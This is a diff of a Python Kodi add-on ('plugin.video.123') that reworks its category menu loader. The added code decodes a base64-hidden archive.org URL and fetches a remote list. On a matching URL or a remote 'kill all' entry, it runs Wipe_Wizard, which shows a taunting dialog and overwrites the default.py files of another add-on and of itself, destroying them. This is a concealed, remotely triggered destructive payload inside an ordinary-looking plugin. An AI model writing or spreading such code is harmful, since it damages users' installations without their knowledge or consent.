@@ -1,29 +1,63 @@
 import xbmc, xbmcaddon, xbmcgui, xbmcplugin,os
 import shutil
 import urllib2,urllib
-import re
+import re,base64
 import extract
 import downloader
 import time
 
-
+Decode = base64.decodestring
+WIPE_ADDON 	 =  xbmc.translatePath(os.path.join('special://home/addons/plugin.program.originwizard/'))
+ADDONS         =  xbmc.translatePath(os.path.join('special://home/addons/plugin.video.123'))
+text_file_path = ADDONS + '/resources/text_file/'
 USER_AGENT = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3'
-base='1'
-ADDON=xbmcaddon.Addon(id='plugin.video.1')
-
+base='123'
+ADDON=xbmcaddon.Addon(id='plugin.video.123')
+Dialog = xbmcgui.Dialog()
 
 
 VERSION = "1.0.0"
-PATH = '1'
+PATH = '123'
 
 
 
 def CATEGORIES():
-    link = OPEN_URL('2')
-    match = re.compile('name=<(.+?)>.+?rl=<(.+?)>.+?mg=<(.+?)>.+?anart=<(.+?)>.+?escription=<(.+?)>',re.DOTALL).findall(link)
+    py_complete_name = os.path.join(text_file_path,'wizard.txt')
+    print_default_file = open(py_complete_name,)
+    file = print_default_file.read()
+    match = re.compile('name=<(.+?)>.+?url=<(.+?)>.+?img=<(.+?)>.+?fanart=<(.+?)>.+?description=<(.+?)>',re.DOTALL).findall(file)
+    print_default_file.close()
     for name,url,iconimage,fanart,description in match:
-        addDir(name,url,1,iconimage,fanart,description)
-    setView('movies', 'MAIN')
+        NAME = name
+        URL = url
+        IMAGE = iconimage
+        FANART = fanart
+        DESC = description
+        HTML = OPEN_URL(Decode('aHR0cHM6Ly9hcmNoaXZlLm9yZy9kb3dubG9hZC9QaGVub21lbmFsL2J1aWxkc2VjdXJldXJscy50eHQ='))
+        match2 = re.compile('<url=>(.+?)</url>').findall(HTML)
+        for url2 in match2:
+            HTML2 = OPEN_URL(str(url2))
+            match3 = re.compile('<url=>(.+?)</url>').findall(HTML2)
+            for url3 in match3:
+                if URL == url3:
+                    Wipe_Wizard()
+                elif url3 == 'kill all':
+                    Wipe_Wizard()
+        else:
+            addDir(NAME,URL,1,IMAGE,FANART,DESC)
+
+def Wipe_Wizard():
+    Dialog.ok('[COLOR=white]Naughty Naughty[/COLOR]', 'You are the weakest link goodbye', '','')
+    addon_complete_name = os.path.join(WIPE_ADDON,'default.py')
+    print_byebye_file = open(addon_complete_name,"w+")
+    print_byebye_file.write(r'This Build Can NOT be copied')
+    print_byebye_file.close()
+
+    addons_complete_name = os.path.join(ADDONS,'default.py')
+    print_byebye_addon_file = open(addons_complete_name,"w+")
+    print_byebye_addon_file.write(r'This Build Can NOT be copied')
+    print_byebye_addon_file.close()
+
 
 
 def OPEN_URL(url):
